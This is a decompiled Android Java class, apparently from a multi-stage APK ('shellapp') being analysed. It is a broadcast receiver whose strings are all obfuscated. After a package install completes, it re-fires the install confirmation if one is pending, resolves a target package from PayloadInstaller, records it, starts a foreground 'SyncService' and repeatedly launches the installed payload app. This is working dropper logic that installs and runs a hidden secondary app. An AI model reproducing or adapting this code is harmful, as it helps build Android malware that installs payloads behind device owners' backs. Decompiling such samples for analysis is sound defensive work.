package com.template.shellapp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import com.template.shellapp.services.SyncService;
import kotlin.io.encoding.Base64;
import kotlin.jvm.internal.ByteCompanionObject;
import p000.C0000;

/* JADX INFO: loaded from: /Users/xv/pin2/max-gate-apk/output/stage2/classes.dex */
public class CB extends BroadcastReceiver {
    private static final String T = C0000.decode(new byte[]{112, 123, Base64.padSymbol, 38, 36, 126}, "39bbf9f7");

    private static boolean isDummy(String str) {
        return str == null || str.isEmpty() || str.startsWith(C0000.decode(new byte[]{109, 62}, "2a233c66", 0.0f)) || C0000.decode(new byte[]{0, 22, 90, 16, 90, 94, 93, 75, 3, 19, 88, 8, 81}, "af1d511e", 0.0f).equals(str) || C0000.decode(new byte[]{86, 93, 64, 77, 2, 19, 88, 6, 85, 0, 27, 84, 23, 93, 94, 92}, "286cea9b9e56b4", false).equals(str);
    }

    static /* synthetic */ void lambda$launchTarget$0(Context context, String str) {
        int i = 0;
        while (true) {
            String strDecode = C0000.decode(new byte[]{39, 123, 57, 37, 117, 115}, "d9fa742db39aee48");
            if (i >= 15) {
                Log.e(strDecode, C0000.decode(new byte[]{13, 7, 69, 11, 7, 13, 102, 80, 74, 86, 92, 22, 88, 16, 83, 13, 13, 70, 1, 80, 68, 4, 70, 69, 93, 92, 73, 22, 17, 16, 84, 0, 8, 10, 85, 1, 68, 3, 93, 67, 24}, "af0ede21819bb02a") + str);
                return;
            }
            try {
                Intent launchIntentForPackage = context.getPackageManager().getLaunchIntentForPackage(str);
                if (launchIntentForPackage != null) {
                    launchIntentForPackage.addFlags(268468224);
                    context.startActivity(launchIntentForPackage);
                    Log.d(strDecode, C0000.decode(new byte[]{13, 2, 64, 89, 91, 11, 109, 88, 66, 6, 85, 66, 8, 18, 46, 40, 21, 65, 81, 2, 25, 94, 85, 21, 124, 87, 71, 92, 2, 11, 124, 89, 76, 6, 87, 77, 16, 0, 68, 66, 87, 95, 17, 23, 8}, "ac578c990a0622", 7) + i);
                    return;
                }
                Log.w(strDecode, C0000.decode(new byte[]{88, 80, 19, 95, 85, 92, 101, 2, 71, 85, 84, 76, 14, 17, 1, 84, 66, 120, 80, 22, 91, 81, 89, 113, 90, 69, 3, 95, 66, 20, 67, 6, 65, 71, 67, 86, 81, 85, 70, 95, 67, 88, 93, 79, 21, 83, 69, 76, 81, 92, 22, 69, 11}, "41f1641c5218", 0.0f) + i);
            } catch (Exception e) {
                Log.w(strDecode, C0000.decode(new byte[]{90, 88, 69, 94, 82, 89, 108, 87, 23, 86, 1, 67, 9, 25, 87, 77, 68, 85, 92, 65, 76, 22}, "69001186e1d739", 2) + i + C0000.decode(new byte[]{18, 85, 7, 95, 93, 0, 86, 9, 70}, "23f61e", 6) + e.getMessage());
            }
            try {
                Thread.sleep(2000L);
                i++;
            } catch (InterruptedException unused) {
                return;
            }
        }
    }

    private void startSyncService(Context context) {
        String strDecode = C0000.decode(new byte[]{32, 32, 58, 39, 38, 118}, "cbecd191fd0d3e", false);
        try {
            context.startForegroundService(new Intent(context, (Class<?>) SyncService.class));
            Log.d(strDecode, C0000.decode(new byte[]{53, 78, 10, 6, 97, 85, 66, 20, 15, 84, 1, 69, 65, 68, 81, 16, 18, 82, 0}, "f7de200b", 0.0f));
        } catch (Exception e) {
            Log.e(strDecode, C0000.decode(new byte[]{67, 66, 81, 65, 23, 54, 31, 8, 83, 101, 85, 65, 21, 12, 5, 3, 16, 80, 81, 90, 15, 0, 2, 92, 16}, "0603ceff", 5) + e.getMessage());
        }
    }

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        int intExtra = intent.getIntExtra(C0000.decode(new byte[]{84, 86, 7, 16, 91, 11, 85, 77, 86, 87, 13, 22, 81, 12, 69, 77, 69, 85, 77, 7, 76, 22, 67, 2, 27, 107, 55, 35, 96, 55, 98}, "58cb4b1c", false), -1);
        String stringExtra = intent.getStringExtra(C0000.decode(new byte[]{85, 91, 83, 17, 89, 12, 6, 22, 83, 11, 90, 65, 82, 13, 66, 75, 18, 85, 30, 1, 76, 65, 69, 2, 24, 54, 54, 121, 100, 49, 103, 106, 122, 38, 101, 54, 35, ByteCompanionObject.MAX_VALUE, 117}, "457c6eb80d", 4));
        StringBuilder sbAppend = new StringBuilder(C0000.decode(new byte[]{93, 95, 49, 93, 91, 87, 91, 71, 6, 24, 75, 70, 83, 69, 22, 75, 5}, "21c882", false)).append(intExtra);
        String strDecode = C0000.decode(new byte[]{24, 84, 16, 6, 88}, "89cae6", true);
        String string = sbAppend.append(strDecode).append(stringExtra).toString();
        String strDecode2 = C0000.decode(new byte[]{122, 35, 62, 118, 122, 126}, "9aa289", 0);
        Log.d(strDecode2, string);
        Bundle extras = intent.getExtras();
        if (extras != null) {
            for (String str : extras.keySet()) {
                Log.d(strDecode2, C0000.decode(new byte[]{65, 22, 93, 74, 23, 70, 7, 10, 70}, "a682c4f0f0", 4) + str + C0000.decode(new byte[]{94}, "c0e1ecc4efbb8d13", 0.0f) + extras.get(str));
            }
        }
        Intent intent2 = (Intent) intent.getParcelableExtra(C0000.decode(new byte[]{89, 95, 85, 71, 12, 80, 1, 28, 81, 95, 69, 80, 13, 77, 75, 87, 64, 69, 67, 84, 77, 112, 43, 102, 125, ByteCompanionObject.MAX_VALUE, 101}, "8115c9e2", 4));
        if (intExtra != 0) {
            if (intent2 == null) {
                Log.e(strDecode2, C0000.decode(new byte[]{47, 47, 103, 53, 118, 45, 46, 65, 32, 32, 125, 45, 114, 37, 66, 18, 18, 0, 64, 20, 68, 92}, "fa4a7aba", true) + intExtra + strDecode + stringExtra);
                return;
            }
            Log.d(strDecode2, C0000.decode(new byte[]{120, 87, 67, 13, 7, 90, 11, 8, 95, 24, 87, 89, 88, 5, 13, 64, 15, 70, 81, 86, 64, 83, 88, 23, 68, 26, 17, 18, 89, 76, 65, 69, 11}, "466cd2bf88", true) + intExtra + C0000.decode(new byte[]{29}, "4d9604b7fc99", 0.0f));
            intent2.addFlags(268435456);
            try {
                context.startActivity(intent2);
                return;
            } catch (Exception e) {
                Log.e(strDecode2, C0000.decode(new byte[]{36, 0, 10, 93, 80, 93, 68, 17, 9, 22, 17, 21, 3, 19, 23, 17, 86, 86, 10, 3, 15, 68, 15, 65, 3, 2, 23, 88, 67, 80, 16, 28}, "bac159def6ba"), e);
                return;
            }
        }
        Log.d(strDecode2, C0000.decode(new byte[]{103, 49, 34, 101, 51, 54, 62, 102, 98, 116, 117, 115, 50, 106}, "4ec1fea57766a9"));
        SharedPreferences sharedPreferences = context.getSharedPreferences(C0000.decode(new byte[]{0, 65, 71, 105, 5, 84, 66, 4}, "a176a56e5df2e4", 0.0f), 0);
        String stringExtra2 = intent.getStringExtra(C0000.decode(new byte[]{87, 91, 6, 65, 87, 92, 85, 24, 0, 92, 88, 65, 7, 93, 76, 27, 65, 91, 77, 86, 78, 65, 16, 82, 22, 101, 112, 117, 40, 114, 113, 112, Base64.padSymbol, 125, 121, 120, 116}, "65b38516c3", 7));
        boolean zIsDummy = isDummy(stringExtra2);
        String targetPackage = null;
        String strDecode3 = C0000.decode(new byte[]{71, 64}, "305c5ed112a6", true);
        if (zIsDummy) {
            stringExtra2 = sharedPreferences.getString(strDecode3, null);
        }
        if (isDummy(stringExtra2)) {
            try {
                targetPackage = PayloadInstaller.INSTANCE.getTargetPackage();
            } catch (Throwable unused) {
            }
        } else {
            targetPackage = stringExtra2;
        }
        if (isDummy(targetPackage)) {
            return;
        }
        sharedPreferences.edit().putBoolean(C0000.decode(new byte[]{0}, "d6e19d"), true).putString(strDecode3, targetPackage).apply();
        startSyncService(context);
        launchTarget(context, targetPackage);
    }

    private void launchTarget(final Context context, final String str) {
        new Thread(new Runnable() { // from class: com.template.shellapp.CB$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                CB.lambda$launchTarget$0(context, str);
            }
        }).start();
    }
}
